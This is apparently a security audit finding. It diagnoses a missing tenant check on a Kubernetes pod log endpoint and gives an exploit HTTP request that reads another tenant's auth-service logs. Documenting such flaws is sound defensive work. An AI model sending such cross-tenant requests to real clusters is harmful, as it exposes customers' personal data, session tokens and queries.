diagnosis: The Kubernetes pod log reading endpoint retrieves container logs using unverified namespace and pod_name path parameters. Although current_user is authenticated, the endpoint fails to verify that namespace matches current_user.tenant_id. An attacker can stream container logs from system namespaces or other tenant pods, capturing unencrypted customer PII, session tokens, and database queries.
exploit_request:
GET /k8s/namespaces/tenant-corp-banking/pods/auth-service-79bbd-49x/logs?tail_lines=500 HTTP/1.1
Host: cluster-ops.cloud.net
Authorization: Bearer <attacker_jwt>
Accept: application/json
